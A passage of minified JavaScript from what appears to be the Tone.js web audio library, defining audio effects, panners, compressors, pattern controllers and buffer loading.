t.AudioNode.prototype.dispose.call(this),this.mid.dispose(),this.mid=null,this.side.dispose(),this.side=null,this._left.dispose(),this._left=null,this._timesTwoLeft.dispose(),this._timesTwoLeft=null,this._right.dispose(),this._right=null,this._timesTwoRight.dispose(),this._timesTwoRight=null,this._merge.dispose(),this._merge=null,this},t.MidSideMerge})),n((function(t){return t.MidSideCompressor=function(e){t.AudioNode.call(this),e=t.defaultArg(e,t.MidSideCompressor.defaults),this._midSideSplit=this.input=new t.MidSideSplit,this._midSideMerge=this.output=new t.MidSideMerge,this.mid=new t.Compressor(e.mid),this.side=new t.Compressor(e.side),this._midSideSplit.mid.chain(this.mid,this._midSideMerge.mid),this._midSideSplit.side.chain(this.side,this._midSideMerge.side),this._readOnly(["mid","side"])},t.extend(t.MidSideCompressor,t.AudioNode),t.MidSideCompressor.defaults={mid:{ratio:3,threshold:-24,release:.03,attack:.02,knee:16},side:{ratio:6,threshold:-30,release:.25,attack:.03,knee:10}},t.MidSideCompressor.prototype.dispose=function(){return t.AudioNode.prototype.dispose.call(this),this._writable(["mid","side"]),this.mid.dispose(),this.mid=null,this.side.dispose(),this.side=null,this._midSideSplit.dispose(),this._midSideSplit=null,this._midSideMerge.dispose(),this._midSideMerge=null,this},t.MidSideCompressor})),n((function(t){return t.Mono=function(){t.AudioNode.call(this),this.createInsOuts(1,0),this._merge=this.output=new t.Merge,this.input.connect(this._merge,0,0),this.input.connect(this._merge,0,1)},t.extend(t.Mono,t.AudioNode),t.Mono.prototype.dispose=function(){return t.AudioNode.prototype.dispose.call(this),this._merge.dispose(),this._merge=null,this},t.Mono})),n((function(t){return t.MultibandCompressor=function(e){t.AudioNode.call(this),e=t.defaultArg(arguments,t.MultibandCompressor.defaults),this._splitter=this.input=new t.MultibandSplit({lowFrequency:e.lowFrequency,highFrequency:e.highFrequency}),this.lowFrequency=this._splitter.lowFrequency,this.highFrequency=this._splitter.highFrequency,this.output=new t.Gain,this.low=new t.Compressor(e.low),this.mid=new t.Compressor(e.mid),this.high=new t.Compressor(e.high),this._splitter.low.chain(this.low,this.output),this._splitter.mid.chain(this.mid,this.output),this._splitter.high.chain(this.high,this.output),this._readOnly(["high","mid","low","highFrequency","lowFrequency"])},t.extend(t.MultibandCompressor,t.AudioNode),t.MultibandCompressor.defaults={low:t.Compressor.defaults,mid:t.Compressor.defaults,high:t.Compressor.defaults,lowFrequency:250,highFrequency:2e3},t.MultibandCompressor.prototype.dispose=function(){return t.AudioNode.prototype.dispose.call(this),this._splitter.dispose(),this._writable(["high","mid","low","highFrequency","lowFrequency"]),this.low.dispose(),this.mid.dispose(),this.high.dispose(),this._splitter=null,this.low=null,this.mid=null,this.high=null,this.lowFrequency=null,this.highFrequency=null,this},t.MultibandCompressor})),n((function(t){if(t.supported&&!window.StereoPannerNode){var e=function(e){this.context=e,this.pan=new t.Signal(0,t.Type.AudioRange);var n=new t.WaveShaper((function(e){return t.equalPowerScale((e+1)/2)}),4096),r=new t.WaveShaper((function(e){return t.equalPowerScale(1-(e+1)/2)}),4096),i=new t.Gain,o=new t.Gain,s=this.input=new t.Split;(new t.Zero).fan(n,r);var a=this.output=new t.Merge;s.left.chain(i,a.left),s.right.chain(o,a.right),this.pan.chain(r,i.gain),this.pan.chain(n,o.gain)};e.prototype.disconnect=function(){this.output.disconnect.apply(this.output,arguments)},e.prototype.connect=function(){this.output.connect.apply(this.output,arguments)},AudioContext.prototype.createStereoPanner=function(){return new e(this)},t.Context.prototype.createStereoPanner=function(){return new e(this)}}})),n((function(t){return t.Panner=function(e){t.AudioNode.call(this),this._panner=this.input=this.output=this.context.createStereoPanner(),this.pan=this._panner.pan,this.pan.value=t.defaultArg(e,0),this._readOnly("pan")},t.extend(t.Panner,t.AudioNode),t.Panner.prototype.dispose=function(){return t.AudioNode.prototype.dispose.call(this),this._writable("pan"),this._panner.disconnect(),this._panner=null,this.pan=null,this},t.Panner})),n((function(t){return t.Panner3D=function(){var e=t.defaults(arguments,["positionX","positionY","positionZ"],t.Panner3D);t.AudioNode.call(this),this._panner=this.input=this.output=this.context.createPanner(),this._panner.panningModel=e.panningModel,this._panner.maxDistance=e.maxDistance,this._panner.distanceModel=e.distanceModel,this._panner.coneOuterGain=e.coneOuterGain,this._panner.coneOuterAngle=e.coneOuterAngle,this._panner.coneInnerAngle=e.coneInnerAngle,this._panner.refDistance=e.refDistance,this._panner.rolloffFactor=e.rolloffFactor,this._orientation=[e.orientationX,e.orientationY,e.orientationZ],this._position=[e.positionX,e.positionY,e.positionZ],this.orientationX=e.orientationX,this.orientationY=e.orientationY,this.orientationZ=e.orientationZ,this.positionX=e.positionX,this.positionY=e.positionY,this.positionZ=e.positionZ},t.extend(t.Panner3D,t.AudioNode),t.Panner3D.defaults={positionX:0,positionY:0,positionZ:0,orientationX:0,orientationY:0,orientationZ:0,panningModel:"equalpower",maxDistance:1e4,distanceModel:"inverse",coneOuterGain:0,coneOuterAngle:360,coneInnerAngle:360,refDistance:1,rolloffFactor:1},t.Panner3D.prototype._rampTimeConstant=.01,t.Panner3D.prototype.setPosition=function(t,e,n){if(this._panner.positionX){var r=this.now();this._panner.positionX.setTargetAtTime(t,r,this._rampTimeConstant),this._panner.positionY.setTargetAtTime(e,r,this._rampTimeConstant),this._panner.positionZ.setTargetAtTime(n,r,this._rampTimeConstant)}else this._panner.setPosition(t,e,n);return this._position=Array.prototype.slice.call(arguments),this},t.Panner3D.prototype.setOrientation=function(t,e,n){if(this._panner.orientationX){var r=this.now();this._panner.orientationX.setTargetAtTime(t,r,this._rampTimeConstant),this._panner.orientationY.setTargetAtTime(e,r,this._rampTimeConstant),this._panner.orientationZ.setTargetAtTime(n,r,this._rampTimeConstant)}else this._panner.setOrientation(t,e,n);return this._orientation=Array.prototype.slice.call(arguments),this},Object.defineProperty(t.Panner3D.prototype,"positionX",{set:function(t){this._position[0]=t,this.setPosition.apply(this,this._position)},get:function(){return this._position[0]}}),Object.defineProperty(t.Panner3D.prototype,"positionY",{set:function(t){this._position[1]=t,this.setPosition.apply(this,this._position)},get:function(){return this._position[1]}}),Object.defineProperty(t.Panner3D.prototype,"positionZ",{set:function(t){this._position[2]=t,this.setPosition.apply(this,this._position)},get:function(){return this._position[2]}}),Object.defineProperty(t.Panner3D.prototype,"orientationX",{set:function(t){this._orientation[0]=t,this.setOrientation.apply(this,this._orientation)},get:function(){return this._orientation[0]}}),Object.defineProperty(t.Panner3D.prototype,"orientationY",{set:function(t){this._orientation[1]=t,this.setOrientation.apply(this,this._orientation)},get:function(){return this._orientation[1]}}),Object.defineProperty(t.Panner3D.prototype,"orientationZ",{set:function(t){this._orientation[2]=t,this.setOrientation.apply(this,this._orientation)},get:function(){return this._orientation[2]}}),t.Panner3D._aliasProperty=function(e){Object.defineProperty(t.Panner3D.prototype,e,{set:function(t){this._panner[e]=t},get:function(){return this._panner[e]}})},t.Panner3D._aliasProperty("panningModel"),t.Panner3D._aliasProperty("refDistance"),t.Panner3D._aliasProperty("rolloffFactor"),t.Panner3D._aliasProperty("distanceModel"),t.Panner3D._aliasProperty("coneInnerAngle"),t.Panner3D._aliasProperty("coneOuterAngle"),t.Panner3D._aliasProperty("coneOuterGain"),t.Panner3D._aliasProperty("maxDistance"),t.Panner3D.prototype.dispose=function(){return t.AudioNode.prototype.dispose.call(this),this._panner.disconnect(),this._panner=null,this._orientation=null,this._position=null,this},t.Panner3D})),n((function(t){return t.PanVol=function(){var e=t.defaults(arguments,["pan","volume"],t.PanVol);t.AudioNode.call(this),this._panner=this.input=new t.Panner(e.pan),this.pan=this._panner.pan,this._volume=this.output=new t.Volume(e.volume),this.volume=this._volume.volume,this._panner.connect(this._volume),this.mute=e.mute,this._readOnly(["pan","volume"])},t.extend(t.PanVol,t.AudioNode),t.PanVol.defaults={pan:0,volume:0,mute:!1},Object.defineProperty(t.PanVol.prototype,"mute",{get:function(){return this._volume.mute},set:function(t){this._volume.mute=t}}),t.PanVol.prototype.dispose=function(){return t.AudioNode.prototype.dispose.call(this),this._writable(["pan","volume"]),this._panner.dispose(),this._panner=null,this.pan=null,this._volume.dispose(),this._volume=null,this.volume=null,this},t.PanVol})),n((function(t){return t.Solo=function(){var e=t.defaults(arguments,["solo"],t.Solo);t.AudioNode.call(this),this.input=this.output=new t.Gain,this._soloBind=this._soloed.bind(this),this.context.on("solo",this._soloBind),this.solo=e.solo},t.extend(t.Solo,t.AudioNode),t.Solo.defaults={solo:!1},Object.defineProperty(t.Solo.prototype,"solo",{get:function(){return this._isSoloed()},set:function(t){t?this._addSolo():this._removeSolo(),this.context.emit("solo",this)}}),Object.defineProperty(t.Solo.prototype,"muted",{get:function(){return 0===this.input.gain.value}}),t.Solo.prototype._addSolo=function(){t.isArray(this.context._currentSolo)||(this.context._currentSolo=[]),this._isSoloed()||this.context._currentSolo.push(this)},t.Solo.prototype._removeSolo=function(){if(this._isSoloed()){var t=this.context._currentSolo.indexOf(this);this.context._currentSolo.splice(t,1)}},t.Solo.prototype._isSoloed=function(){return!!t.isArray(this.context._currentSolo)&&0!==this.context._currentSolo.length&&-1!==this.context._currentSolo.indexOf(this)},t.Solo.prototype._noSolos=function(){return!t.isArray(this.context._currentSolo)||0===this.context._currentSolo.length},t.Solo.prototype._soloed=function(){this._isSoloed()||this._noSolos()?this.input.gain.value=1:this.input.gain.value=0},t.Solo.prototype.dispose=function(){return this.context.off("solo",this._soloBind),this._removeSolo(),this._soloBind=null,t.AudioNode.prototype.dispose.call(this),this},t.Solo})),n((function(t){return t.Waveform=function(){var e=t.defaults(arguments,["size"],t.Waveform);e.type=t.Analyser.Type.Waveform,t.AudioNode.call(this),this._analyser=this.input=this.output=new t.Analyser(e)},t.extend(t.Waveform,t.AudioNode),t.Waveform.defaults={size:1024},t.Waveform.prototype.getValue=function(){return this._analyser.getValue()},Object.defineProperty(t.Waveform.prototype,"size",{get:function(){return this._analyser.size},set:function(t){this._analyser.size=t}}),t.Waveform.prototype.dispose=function(){t.AudioNode.prototype.dispose.call(this),this._analyser.dispose(),this._analyser=null},t.Waveform})),n((function(t){return t.CtrlInterpolate=function(){var e=t.defaults(arguments,["values","index"],t.CtrlInterpolate);t.call(this),this.values=e.values,this.index=e.index},t.extend(t.CtrlInterpolate),t.CtrlInterpolate.defaults={index:0,values:[]},Object.defineProperty(t.CtrlInterpolate.prototype,"value",{get:function(){var t=this.index;t=Math.min(t,this.values.length-1);var e=Math.floor(t),n=this.values[e],r=this.values[Math.ceil(t)];return this._interpolate(t-e,n,r)}}),t.CtrlInterpolate.prototype._interpolate=function(e,n,r){if(t.isArray(n)){for(var i=[],o=0;o<n.length;o++)i[o]=this._interpolate(e,n[o],r[o]);return i}if(t.isObject(n)){var s={};for(var a in n)s[a]=this._interpolate(e,n[a],r[a]);return s}return(1-e)*(n=this._toNumber(n))+e*(r=this._toNumber(r))},t.CtrlInterpolate.prototype._toNumber=function(e){return t.isNumber(e)?e:this.toSeconds(e)},t.CtrlInterpolate.prototype.dispose=function(){this.values=null},t.CtrlInterpolate})),n((function(t){return t.CtrlMarkov=function(e,n){t.call(this),this.values=t.defaultArg(e,{}),this.value=t.defaultArg(n,Object.keys(this.values)[0])},t.extend(t.CtrlMarkov),t.CtrlMarkov.prototype.next=function(){if(this.values.hasOwnProperty(this.value)){var e=this.values[this.value];if(t.isArray(e))for(var n=this._getProbDistribution(e),r=Math.random(),i=0,o=0;o<n.length;o++){var s=n[o];if(r>i&&r<i+s){var a=e[o];t.isObject(a)?this.value=a.value:this.value=a}i+=s}else this.value=e}return this.value},t.CtrlMarkov.prototype._getProbDistribution=function(e){for(var n=[],r=0,i=!1,o=0;o<e.length;o++){var s=e[o];t.isObject(s)?(i=!0,n[o]=s.probability):n[o]=1/e.length,r+=n[o]}if(i)for(var a=0;a<n.length;a++)n[a]=n[a]/r;return n},t.CtrlMarkov.prototype.dispose=function(){this.values=null},t.CtrlMarkov})),n((function(t){return t.CtrlPattern=function(){var e=t.defaults(arguments,["values","type"],t.CtrlPattern);t.call(this),this.values=e.values,this.index=0,this._type=null,this._shuffled=null,this._direction=null,this.type=e.type},t.extend(t.CtrlPattern),t.CtrlPattern.Type={Up:"up",Down:"down",UpDown:"upDown",DownUp:"downUp",AlternateUp:"alternateUp",AlternateDown:"alternateDown",Random:"random",RandomWalk:"randomWalk",RandomOnce:"randomOnce"},t.CtrlPattern.defaults={type:t.CtrlPattern.Type.Up,values:[]},Object.defineProperty(t.CtrlPattern.prototype,"value",{get:function(){if(0!==this.values.length){if(1===this.values.length)return this.values[0];this.index=Math.min(this.index,this.values.length-1);var e=this.values[this.index];return this.type===t.CtrlPattern.Type.RandomOnce&&(this.values.length!==this._shuffled.length&&this._shuffleValues(),e=this.values[this._shuffled[this.index]]),e}}}),Object.defineProperty(t.CtrlPattern.prototype,"type",{get:function(){return this._type},set:function(e){this._type=e,this._shuffled=null,this._type===t.CtrlPattern.Type.Up||this._type===t.CtrlPattern.Type.UpDown||this._type===t.CtrlPattern.Type.RandomOnce||this._type===t.CtrlPattern.Type.AlternateUp?this.index=0:this._type!==t.CtrlPattern.Type.Down&&this._type!==t.CtrlPattern.Type.DownUp&&this._type!==t.CtrlPattern.Type.AlternateDown||(this.index=this.values.length-1),this._type===t.CtrlPattern.Type.UpDown||this._type===t.CtrlPattern.Type.AlternateUp?this._direction=t.CtrlPattern.Type.Up:this._type!==t.CtrlPattern.Type.DownUp&&this._type!==t.CtrlPattern.Type.AlternateDown||(this._direction=t.CtrlPattern.Type.Down),this._type===t.CtrlPattern.Type.RandomOnce?this._shuffleValues():this._type===t.CtrlPattern.Random&&(this.index=Math.floor(Math.random()*this.values.length))}}),t.CtrlPattern.prototype.next=function(){var e=this.type;return e===t.CtrlPattern.Type.Up?(this.index++,this.index>=this.values.length&&(this.index=0)):e===t.CtrlPattern.Type.Down?(this.index--,this.index<0&&(this.index=this.values.length-1)):e===t.CtrlPattern.Type.UpDown||e===t.CtrlPattern.Type.DownUp?(this._direction===t.CtrlPattern.Type.Up?this.index++:this.index--,this.index<0?(this.index=1,this._direction=t.CtrlPattern.Type.Up):this.index>=this.values.length&&(this.index=this.values.length-2,this._direction=t.CtrlPattern.Type.Down)):e===t.CtrlPattern.Type.Random?this.index=Math.floor(Math.random()*this.values.length):e===t.CtrlPattern.Type.RandomWalk?Math.random()<.5?(this.index--,this.index=Math.max(this.index,0)):(this.index++,this.index=Math.min(this.index,this.values.length-1)):e===t.CtrlPattern.Type.RandomOnce?(this.index++,this.index>=this.values.length&&(this.index=0,this._shuffleValues())):e===t.CtrlPattern.Type.AlternateUp?(this._direction===t.CtrlPattern.Type.Up?(this.index+=2,this._direction=t.CtrlPattern.Type.Down):(this.index-=1,this._direction=t.CtrlPattern.Type.Up),this.index>=this.values.length&&(this.index=0,this._direction=t.CtrlPattern.Type.Up)):e===t.CtrlPattern.Type.AlternateDown&&(this._direction===t.CtrlPattern.Type.Up?(this.index+=1,this._direction=t.CtrlPattern.Type.Down):(this.index-=2,this._direction=t.CtrlPattern.Type.Up),this.index<0&&(this.index=this.values.length-1,this._direction=t.CtrlPattern.Type.Down)),this.value},t.CtrlPattern.prototype._shuffleValues=function(){var t=[];this._shuffled=[];for(var e=0;e<this.values.length;e++)t[e]=e;for(;t.length>0;){var n=t.splice(Math.floor(t.length*Math.random()),1);this._shuffled.push(n[0])}},t.CtrlPattern.prototype.dispose=function(){this._shuffled=null,this.values=null},t.CtrlPattern})),n((function(t){return t.CtrlRandom=function(){var e=t.defaults(arguments,["min","max"],t.CtrlRandom);t.call(this),this.min=e.min,this.max=e.max,this.integer=e.integer},t.extend(t.CtrlRandom),t.CtrlRandom.defaults={min:0,max:1,integer:!1},Object.defineProperty(t.CtrlRandom.prototype,"value",{get:function(){var t=this.toSeconds(this.min),e=this.toSeconds(this.max),n=Math.random(),r=n*t+(1-n)*e;return this.integer&&(r=Math.floor(r)),r}}),t.CtrlRandom})),n((function(t){return t.Buffers=function(e){var n=Array.prototype.slice.call(arguments);n.shift();var r=t.defaults(n,["onload","baseUrl"],t.Buffers);for(var i in t.call(this),this._buffers={},this.baseUrl=r.baseUrl,this._loadingCount=0,e)this._loadingCount++,this.add(i,e[i],this._bufferLoaded.bind(this,r.onload))},t.extend(t.Buffers),t.Buffers.defaults={onload:t.noOp,baseUrl:""},t.Buffers.prototype.has=function(t){return this._buffers.hasOwnProperty(t)},t.Buffers.prototype.get=function(t){if(this.has(t))return this._buffers[t];throw new Error("Tone.Buffers: no buffer named "+t)},t.Buffers.prototype._bufferLoaded=function(t){this._loadingCount--,0===this._loadingCount&&t&&t(this)},Object.defineProperty(t.Buffers.prototype,"loaded",{get:function(){var t=!0;for(var e in this._buffers){var n=this.get(e);t=t&&n.loaded}return t}}),t.Buffers.prototype.add=function(e,n,r){return r=t.defaultArg(r,t.noOp),n instanceof t.Buffer?(this._buffers[e]=n,r(this)):n instanceof AudioBuffer?(this._buffers[e]=new t.Buffer(n),r(this)):t.isString(n)&&(this._buffers[e]=new t.Buffer(this.baseUrl+n,r)),this},t.Buffers.prototype.dispose=function(){for(var e in t.prototype.dispose.call(this),this._buffers)this._buffers[e].dispose();return this._buffers=null,this},t.Buffers})),n((function(t){var e={};return t.prototype.send=function(n,r){e.hasOwnProperty(n)||(e[n]=this.context.createGain()),r=t.defaultArg(r,0);var i=new t.Gain(r,t.Type.Decibels);return this.connect(i),i.connect(e[n]),i},t.prototype.receive=function(t,n){return e.hasOwnProperty(t)||(e[t]=this.context.createGain()),e[t].connect(this,0,n),this},t.Context.on("init",(function(t){t.Buses?e=t.Buses:(e={},t.Buses=e)})),t})),n((function(t){return t.Draw=function(){t.call(this),this._events=new t.Timeline,this.expiration=.25,this.anticipation=.008,this._boundDrawLoop=this._drawLoop.bind(this)},t.extend(t.Draw),t.Draw.prototype.schedule=function(t,e){return this._events.add({callback:t,time:this.toSeconds(e)}),1===this._events.length&&requestAnimationFrame(this._boundDrawLoop),this},t.Draw.prototype.cancel=function(t){return this._events.cancel(this.toSeconds(t)),this},t.Draw.prototype._drawLoop=function(){for(var e=t.now();this._events.length&&this._events.peek().time-this.anticipation<=e;){var n=this._events.shift();e-n.time<=this.expiration&&n.callback()}this._events.length>0&&requestAnimationFrame(this._boundDrawLoop)},t.Draw=new t.Draw,t.Draw})),n((function(t){t.Listener=function(){t.call(this),this._orientation=[0,0,0,0,0,0],this._position=[0,0,0],t.getContext(function(){this.set(e.defaults)}.bind(this))},t.extend(t.Listener),t.Listener.defaults={positionX:0,positionY:0,positionZ:0,forwardX:0,forwardY:0,forwardZ:1,upX:0,upY:1,upZ:0},t.Listener.prototype._rampTimeConstant=.01,t.Listener.prototype.setPosition=function(t,e,n){if(this.context.listener.positionX){var r=this.now();this.context.listener.positionX.setTargetAtTime(t,r,this._rampTimeConstant),this.context.listener.positionY.setTargetAtTime(e,r,this._rampTimeConstant),this.context.listener.positionZ.setTargetAtTime(n,r,this._rampTimeConstant)}else this.context.listener.setPosition(t,e,n);return this._position=Array.prototype.slice.call(arguments),this},t.Listener.prototype.setOrientation=function(t,e,n,r,i,o){if(this.context.listener.forwardX){var s=this.now();this.context.listener.forwardX.setTargetAtTime(t,s,this._rampTimeConstant),this.context.listener.forwardY.setTargetAtTime(e,s,this._rampTimeConstant),this.context.listener.forwardZ.setTargetAtTime(n,s,this._rampTimeConstant),this.context.listener.upX.setTargetAtTime(r,s,this._rampTimeConstant),this.context.listener.upY.setTargetAtTime(i,s,this._rampTimeConstant),this.context.listener.upZ.setTargetAtTime(o,s,this._rampTimeConstant)}else this.context.listener.setOrientation(t,e,n,r,i,o);return this._orientation=Array.prototype.slice.call(arguments),this},Object.defineProperty(t.Listener.prototype,"positionX",{set:function(t){this._position[0]=t,this.setPosition.apply(this,this._position)},get:function(){return this._position[0]}}),Object.defineProperty(t.Listener.prototype,"positionY",{set:function(t){this._position[1]=t,this.setPosition.apply(this,this._position)},get:function(){return this._position[1]}}),Object.defineProperty(t.Listener.prototype,"positionZ",{set:function(t){this._position[2]=t,this.setPosition.apply(this,this._position)},get:function(){return this._position[2]}}),Object.defineProperty(t.Listener.prototype,"forwardX",{set:function(t){this._orientation[0]=t,this.setOrientation.apply(this,this._orientation)},get:function(){return this._orientation[0]}}),Object.defineProperty(t.Listener.prototype,"forwardY",{set:function(t){this._orientation[1]=t,this.setOrientation.apply(this,this._orientation)},get:function(){return this._orientation[1]}}),Object.defineProperty(t.Listener.prototype,"forwardZ",{set:function(t){this._orientation[2]=t,this.setOrientation.apply(this,this._orientation)},get:function(){return this._orientation[2]}}),Object.defineProperty(t.Listener.prototype,"upX",{set:function(t){this._orientation[3]=t,this.setOrientation.apply(this,this._orientation)},get:function(){return this._orientation[3]}}),Object.defineProperty(t.Listener.prototype,"upY",{set:function(t){this._orientation[4]=t,this.setOrientation.apply(this,this._orientation)},get:function(){return this._orientation[4]}}),Object.defineProperty(t.Listener.prototype,"upZ",{set:function(t){this._orientation[5]=t,this.setOrientation.apply(this,this._orientation)},get:function(){return this._orientation[5]}}),t.Listener.prototype.dispose=function(){return this._orientation=null,this._position=null,this};var e=t.Listener;return t.Listener=new e,t.Context.on("init",(function(n){n.Listener instanceof e?t.Listener=n.Listener:t.Listener=new e,n.Listener=t.Listener})),t.Listener})),n((function(t){function e(n,r,i,o){o=t.defaultArg(o,0);var s=new t.OfflineContext(2,r,i);t.context=s;var a=n(t.Transport);return s.currentTime>0&&o<1e3?e(n,r,i,++o):{response:a,context:s}}return t.Offline=function(n,r){var i,o=t.context.sampleRate,s=t.context,a=e(n,r,o),u=a.response,c=a.context;return i=u instanceof Promise?u.then((function(){return c.render()})):c.render(),t.context=s,i.then((function(e){return new t.Buffer(e)}))},t.Offline})),n((function(t){return t.Effect=function(){var e=t.defaults(arguments,["wet"],t.Effect);t.AudioNode.call(this),this.createInsOuts(1,1),this._dryWet=new t.CrossFade(e.wet),this.wet=this._dryWet.fade,this.effectSend=new t.Gain,this.effectReturn=new t.Gain,this.input.connect(this._dryWet.a),this.input.connect(this.effectSend),this.effectReturn.connect(this._dryWet.b),this._dryWet.connect(this.output),this._readOnly(["wet"])},t.extend(t.Effect,t.AudioNode),t.Effect.defaults={wet:1},t.Effect.prototype.connectEffect=function(t){return this.effectSend.chain(t,this.effectReturn),this},t.Effect.prototype.dispose=function(){return t.AudioNode.prototype.dispose.call(this),this._dryWet.dispose(),this._dryWet=null,this.effectSend.dispose(),this.effectSend=null,this.effectReturn.dispose(),this.effectReturn=null,this._writable(["wet"]),this.wet=null,this},t.Effect})),n((function(t){return t.AutoFilter=function(){var e=t.defaults(arguments,["frequency","baseFrequency","octaves"],t.AutoFilter);t.Effect.call(this,e),this._lfo=new t.LFO({frequency:e.frequency,amplitude:e.depth}),this.depth=this._lfo.amplitude,this.frequency=this._lfo.frequency,this.filter=new t.Filter(e.filter),this._octaves=0,this.connectEffect(this.filter),this._lfo.connect(this.filter.frequency),this.type=e.type,this._readOnly(["frequency","depth"]),this.octaves=e.octaves,this.baseFrequency=e.baseFrequency},t.extend(t.AutoFilter,t.Effect),t.AutoFilter.defaults={frequency:1,type:"sine",depth:1,baseFrequency:200,octaves:2.6,filter:{type:"lowpass",rolloff:-12,Q:1}},t.AutoFilter.prototype.start=function(t){return this._lfo.start(t),this},t.AutoFilter.prototype.stop=function(t){return this._lfo.stop(t),this},t.AutoFilter.prototype.sync=function(t){return this._lfo.sync(t),this},t.AutoFilter.prototype.unsync=function(){return this._lfo.unsync(),this},Object.defineProperty(t.AutoFilter.prototype,"type",{get:function(){return this._lfo.type},set:function(t){this._lfo.type=t}}),Object.defineProperty(t.AutoFilter.prototype,"baseFrequency",{get:function(){return this._lfo.min},set:function(t){this._lfo.min=this.toFrequency(t),this.octaves=this._octaves}}),Object.defineProperty(t.AutoFilter.prototype,"octaves",{get:function(){return this._octaves},set:function(t){this._octaves=t,this._lfo.max=this.baseFrequency*Math.pow(2,t)}}),t.AutoFilter.prototype.dispose=function(){return t.Effect.prototype.dispose.call(this),this._lfo.dispose(),this._lfo=null,this.filter.dispose(),this.filter=null,this._writable(["frequency","depth"]),this.frequency=null,this.depth=null,this},t.AutoFilter})),n((function(t){return t.AutoPanner=function(){var e=t.defaults(arguments,["frequency"],t.AutoPanner);t.Effect.call(this,e),this._lfo=new t.LFO({frequency:e.frequency,amplitude:e.depth,min:-1,max:1}),this.depth=this._lfo.amplitude,this._panner=new t.Panner,this.frequency=this._lfo.frequency,this.connectEffect(this._panner),this._lfo.connect(this._panner.pan),this.type=e.type,this._readOnly(["depth","frequency"])},t.extend(t.AutoPanner,t.Effect),t.AutoPanner.defaults={frequency:1,type:"sine",depth:1},t.AutoPanner.prototype.start=function(t){return this._lfo.start(t),this},t.AutoPanner.prototype.stop=function(t){return this._lfo.stop(t),this},t.AutoPanner.prototype.sync=function(t){return this._lfo.sync(t),this},t.AutoPanner.prototype.unsync=function(){return this._lfo.unsync(),this},Object.defineProperty(t.AutoPanner.prototype,"type",{get:function(){return this._lfo.type},set:function(t){this._lfo.type=t}}),t.AutoPanner.prototype.dispose=function(){return t.Effect.prototype.dispose.call(this),this._lfo.dispose(),this._lfo=null,this._panner.dispose(),this._panner=null,this._writable(["depth","frequency"]),this.frequency=null,this.depth=null,this},t.AutoPanner})),n((function(t){return t.AutoWah=function(){var e=t.defaults(arguments,["baseFrequency","octaves","sensitivity"],t.AutoWah);t.Effect.call(this,e),this.follower=new t.Follower(e.follower),this._sweepRange=new t.ScaleExp(0,1,.5),this._baseFrequency=e.baseFrequency,this._octaves=e.octaves,this._inputBoost=new t.Gain,this._bandpass=new t.Filter({rolloff:-48,frequency:0,Q:e.Q}),this._peaking=new t.Filter(0,"peaking"),this._peaking.gain.value=e.gain,this.gain=this._peaking.gain,this.Q=this._bandpass.Q,this.effectSend.chain(this._inputBoost,this.follower,this._sweepRange),this._sweepRange.connect(this._bandpass.frequency),this._sweepRange.connect(this._peaking.frequency),this.effectSend.chain(this._bandpass,this._peaking,this.effectReturn),this._setSweepRange(),this.sensitivity=e.sensitivity,this._readOnly(["gain","Q"])},t.extend(t.AutoWah,t.Effect),t.AutoWah.defaults={baseFrequency:100,octaves:6,sensitivity:0,Q:2,gain:2,follower:{attack:.3,release:.5}},Object.defineProperty(t.AutoWah.prototype,"octaves",{get:function(){return this._octaves},set:function(t){this._octaves=t,this._setSweepRange()}}),Object.defineProperty(t.AutoWah.prototype,"baseFrequency",{get:function(){return this._baseFrequency},set:function(t){this._baseFrequency=t,this._setSweepRange()}}),Object.defineProperty(t.AutoWah.prototype,"sensitivity",{get:function(){return t.gainToDb(1/this._inputBoost.gain.value)},set:function(e){this._inputBoost.gain.value=1/t.dbToGain(e)}}),t.AutoWah.prototype._setSweepRange=function(){this._sweepRange.min=this._baseFrequency,this._sweepRange.max=Math.min(this._baseFrequency*Math.pow(2,this._octaves),this.context.sampleRate/2)},t.AutoWah.prototype.dispose=function(){return t.Effect.prototype.dispose.call(this),this.follower.dispose(),this.follower=null,this._sweepRange.dispose(),this._sweepRange=null,this._bandpass.dispose(),this._bandpass=null,this._peaking.dispose(),this._peaking=null,this._inputBoost.dispose(),this._inputBoost=null,this._writable(["gain","Q"]),this.gain=null,this.Q=null,this},t.AutoWah})),n((function(t){return t.Modulo=function(e){t.SignalBase.call(this),this.createInsOuts(1,0),this._shaper=new t.WaveShaper(Math.pow(2,16)),this._multiply=new t.Multiply,this._subtract=this.output=new t.Subtract,this._modSignal=new t.Signal(e),this.input.fan(this._shaper,this._subtract),this._modSignal.connect(this._multiply,0,0),this._shaper.connect(this._multiply,0,1),this._multiply.connect(this._subtract,0,1),this._setWaveShaper(e)},t.extend(t.Modulo,t.SignalBase),t.Modulo.prototype._setWaveShaper=function(t){this._shaper.setMap((function(e){return Math.floor((e+1e-4)/t)}))},Object.defineProperty(t.Modulo.prototype,"value",{get:function(){return this._modSignal.value},set:function(t){this._modSignal.value=t,this._setWaveShaper(t)}}),t.Modulo.prototype.dispose=function(){return t.SignalBase.prototype.dispose.call(this),this._shaper.dispose(),this._shaper=null,this._multiply.dispose(),this._multiply=null,this._subtract.dispose(),this._subtract=null,this._modSignal.dispose(),this._modSignal=null,this},t.Modulo})),n((function(t){return t.BitCrusher=function(){var e=t.defaults(arguments,["bits"],t.BitCrusher);t.Effect.call(this,e);var n=1/Math.pow(2,e.bits-1);this._subtract=new t.Subtract,this._modulo=new t.Modulo(n),this._bits=e.bits,this.effectSend.fan(this._subtract,this._modulo),this._modulo.connect(this._subtract,0,1),this._subtract.connect(this.effectReturn)},t.extend(t.BitCrusher,t.Effect),t.BitCrusher.defaults={bits:4},Object.defineProperty(t.BitCrusher.prototype,"bits",{get:function(){return this._bits},set:function(t){this._bits=t;var e=1/Math.pow(2,t-1);this._modulo.value=e}}),t.BitCrusher.prototype.dispose=function(){return t.Effect.prototype.dispose.call(this),this._subtract.dispose(),this._subtract=null,this._modulo.dispose(),this._modulo=null,this},t.BitCrusher})),n((function(t){return t.Chebyshev=function(){var e=t.defaults(arguments,["order"],t.Chebyshev);t.Effect.call(this,e),this._shaper=new t.WaveShaper(4096),this._order=e.order,this.connectEffect(this._shaper),this.order=e.order,this.oversample=e.oversample},t.extend(t.Chebyshev,t.Effect),t.Chebyshev.defaults={order:1,oversample:"none"},t.Chebyshev.prototype._getCoefficient=function(t,e,n){return n.hasOwnProperty(e)||(n[e]=0===e?0:1===e?t:2*t*this._getCoefficient(t,e-1,n)-this._getCoefficient(t,e-2,n)),n[e]},Object.defineProperty(t.Chebyshev.prototype,"order",{get:function(){return this._order},set:function(t){this._order=t;for(var e=new Array(4096),n=e.length,r=0;r<n;++r){var 